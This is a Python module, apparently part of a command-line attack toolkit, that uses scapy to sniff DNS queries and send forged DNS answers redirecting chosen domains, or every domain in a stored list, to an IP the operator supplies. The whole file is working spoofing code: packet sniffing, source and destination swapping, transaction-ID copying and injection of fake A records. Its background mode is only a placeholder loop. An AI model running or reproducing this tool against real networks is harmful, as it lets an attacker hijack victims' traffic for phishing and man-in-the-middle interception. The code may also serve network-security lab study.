"""This package contains everything related to DNS spoofing"""

import click
from functions.general import *
from functions.domains import *
import threading
from scapy.all import DNS, UDP, IP, DNSRR, DNSQR , sr1, send, sniff, sendp
from scapy.layers.l2 import Ether
import time
import os

interface = "udp port 53"
BACKGROUND_SIGNAL_FILE = 'storage/background_signal.txt'

# Global flag to indicate when to stop sniffing
background_signal = threading.Event()

def spoof_dns_all(background):
    '''
    Main function to spoof all dns domains stored in domains.json
    '''

    table = get_domains()
    click.echo("spoofing target using all stored domains")

    attack(background, table)


def spoof_dns_single(background):
    '''
    Main function to spoof domain entered by user
    '''

    domain = click.prompt('Which domain do you want to spoof? Please enter the domain without www.')
    ip = click.prompt('Which IP should it route to?')

    attack(background, {domain: ip})


def attack(background, table):
    '''
    Function to differentiate between foreground and background attack
    '''
    if background:
        return attack_background_start(table)
    
    attack_foreground(table)


def attack_background_start(table):
    if is_background_running():
        click.echo('Attack is already running in the background. Stop this one first before starting another DNS attack.')
        return
    
    click.echo('Starting attack in the background')

    # Reset the stop event
    set_background_signal(False)

    # Create a new thread for the attack function
    thread = threading.Thread(target=attack_background, daemon=True)
    thread.start()


def attack_background_stop():
    # Set the stop event to stop sniffing
    set_background_signal(True)
    time.sleep(1)
    os.remove(BACKGROUND_SIGNAL_FILE)


def attack_foreground(table):
    while True:
        try:
            # TODO: add multi-threading solution
            sniff(filter=interface, prn=lambda pkt: analyze_packet(pkt, table), count=30)
        except KeyboardInterrupt:
            break

    click.echo("Stopped attacking")


def attack_background():
    # real function
    # sniff(filter=interface, prn=lambda pkt: analyze_packet(pkt, table), stop_filter=background_signal.is_set())

    #test function
    with open('temp.txt', 'w') as file:
        while not is_background_signal_set():
            print("running")
            file.write('running\n')
            file.flush()  # Flush the file buffer to ensure the data is written immediately
            time.sleep(1)


def analyze_packet(packet, table):
    print(packet[DNS])
    # check for proper DNS reqs only
    if not packet.haslayer(DNS) or not packet.haslayer(IP):
        return
    
    # filter out answers
    if packet[DNS].qr != 0:
        return
    
    query_name = get_packet_query_name(packet[DNS])
    
    if query_name in table:
        print(f'Found a query to spoof: {query_name}')
        spoof_packet(packet, query_name, table[query_name])
        return


def spoof_packet(packet, spoofed_domain, spoofed_ip):
    print(f"[SPOOFING]: Packet {packet.summary()}\n")
    print(f"\t[SPOOFING] Before: \n {packet.show()}")

    # Make DNS template message
    spoofed_reply = IP() / UDP() / DNS()

    # swap source/dest for UDP and IP layers
    spoofed_reply[IP].src = packet[IP].dst
    spoofed_reply[IP].dst = packet[IP].src
    spoofed_reply[UDP].sport = packet[UDP].dport
    spoofed_reply[UDP].dport = packet[UDP].sport

    # copy the TX ID
    spoofed_reply[DNS].id = packet[DNS].id
    spoofed_reply[DNS].qr = 1 # response (0 is request)
    spoofed_reply[DNS].aa = 0
    spoofed_reply[DNS].qd = packet[DNS].qd # pass the DNS Question Record to the resposne
    spoofed_reply[DNS].an = DNSRR(rrname=spoofed_domain+'.', rdata=spoofed_ip, type="A", rclass="IN")

    # print(spoofed_reply.summary())
    print(f"\t[SPOOFING] AFTER: \n\n  {spoofed_reply.show()}")

    send(spoofed_reply)


def get_packet_query_name(dns_packet):
    name = dns_packet.qd.qname[:-1].decode()
    
    # Remove "www." from the beginning of the name
    if name.startswith("www."):
        name = name[4:]

    return name

def set_background_signal(value):
    with open(BACKGROUND_SIGNAL_FILE, 'w') as file:
        file.write(str(value))


def is_background_signal_set():
    if not os.path.exists(BACKGROUND_SIGNAL_FILE):
        return False

    with open(BACKGROUND_SIGNAL_FILE, 'r') as file:
        value = file.read().strip()
        return value.lower() == 'true'


def is_background_running():
    return os.path.exists(BACKGROUND_SIGNAL_FILE)